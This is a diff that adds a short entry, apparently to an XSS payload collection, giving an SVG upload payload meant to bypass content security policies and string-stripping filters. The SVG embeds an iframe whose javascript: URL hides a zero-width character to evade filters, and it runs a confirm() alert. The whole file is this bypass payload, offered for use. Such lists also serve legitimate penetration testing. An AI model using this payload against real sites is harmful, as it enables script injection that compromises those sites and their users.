@@ -1,0 +1,6 @@
+SVG file upload exploits - for bypassing CSP or bypassing servers that strip strings:
+-------------------------------------------------------------------------------------
+<svg width="600" height="400" xmlns="http://w3.org/2000/svg" xmlns:xhtml="http://w3.org/1999/xhtml">
+ <foreignObject width="100%" height="100%">
+<body xmlns="http://w3.org/1999/xhtml"> <iframe src='javascript​:confirm(10)'></iframe> </body> </foreignObject> </svg>
+
